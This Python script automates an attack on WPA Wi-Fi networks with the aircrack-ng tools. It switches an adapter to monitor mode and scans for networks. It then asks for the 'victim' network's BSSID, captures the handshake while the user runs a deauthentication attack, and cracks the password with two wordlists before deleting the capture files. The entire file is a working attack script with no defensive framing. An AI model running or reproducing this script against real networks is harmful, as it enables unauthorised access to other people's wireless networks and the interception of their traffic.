import os
from time import sleep

os.system("clear")

with open("settings.set", "r") as read_adapter:
    adapter = read_adapter.read()   


def destroy_processes():
	print("Killing all conflicting processes...")
	os.system("sudo airmon-ng check kill")
	os.system("clear")
	

def enable_monitor_mode(adaptername):
	print("Placing the card into monitor mode...")
	os.system(f"sudo airmon-ng start {adaptername}")
	print("Monitor mode enabled...")
	os.system("clear")


mon_adapter = adapter+"mon"

	
def scout_networks(adaptername):
	print("Showing all available networks")
	try:
		os.system(f"sudo airodump-ng {mon_adapter}")
	except KeyboardInterrupt:
		pass
		

def packet_capture(Channel, bssID, adapterName):
	try:
		os.system(f"sudo airodump-ng -w outfile -c {Channel} --bssid {bssID} {mon_adapter}")
	except Exception:
		pass
		

def eapol_identification():
	try:
		os.system("wireshark outfile-01.cap")
	except KeyboardInterrupt:
		pass
		

def redundancy(CHANNEL, BssID, adapterNAME):
	s_or_f = str(input("Did you find EAPOL's in the .cap file? (Y/N)"))
	
	if s_or_f == "N":
		os.system("sudo rm outfile-01.cap outfile-01.csv outfile-01.kismet.csv outfile-01.kismet.netxml outfile-01.log.csv")
		packet_capture(CHANNEL, BssID, adapterNAME)
	else:
		pass


def bruteforce(wordlist1, wordlist2):
	print("PHASE TWO COMPLETE...")
	os.system(f"aircrack-ng outfile-01.cap -w {wordlist1}")
	
	y_n_pass = str(input("Did you manage to break the password? "))
	
	if y_n_pass == "N":
		os.system(f"aircrack-ng outfile-01.cap -w {wordlist2}")
	else:
		pass
		
		
destroy_processes()
enable_monitor_mode(adapter)
scout_networks(adapter)

print("PHASE ONE COMPLETE")
bssid = str(input("Please enter the victim networks BSSID: "))
channel = str(input("Please enter the channel that the network operates on: "))
word1 = str(input("Please enter the location of password file one: "))
word2 = str(input("Please enter the location of password file two: "))

with open("bssid.n", "w") as bssid_write:
	bssid_write.write(bssid)
with open("channel.c", "w") as channel_write:
	channel_write.write(channel)
	
os.system("clear")

print("Beginning packet capture...")
print("You can initiate the deauthentication attack. It has a 30 second delay...")
packet_capture(channel, bssid, adapter)
eapol_identification()
redundancy(channel, bssid, adapter)
bruteforce(word1, word2)

os.system("sudo rm outfile-01.cap outfile-01.csv outfile-01.kismet.csv outfile-01.kismet.netxml outfile-01.log.csv")
os.system(f"sudo airmon-ng stop {mon_adapter}")
